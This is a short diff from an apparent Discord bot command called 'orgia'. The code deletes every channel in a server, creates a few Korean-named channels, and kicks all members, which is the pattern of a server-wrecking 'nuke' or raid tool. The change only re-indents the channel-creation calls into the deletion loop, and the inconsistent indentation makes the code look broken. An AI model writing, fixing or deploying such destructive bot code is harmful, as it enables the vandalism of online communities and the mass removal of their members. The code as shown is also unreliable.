@@ -28,10 +28,10 @@ async def orgia(ctx):
 guild = ctx.guild
   for channel in guild.channels:
       await channel.delete()
-  await guild.create_category("채팅 채널")
-  await guild.create_category("음성 채널")
-  await guild.create_text_channel(name="일반")
-  await guild.create_voice_channel(name="일반")
+      await guild.create_category("채팅 채널")
+      await guild.create_category("음성 채널")
+      await guild.create_text_channel(name="일반")
+      await guild.create_voice_channel(name="일반")
   for member in guild.members:
       try:
           await member.kick()
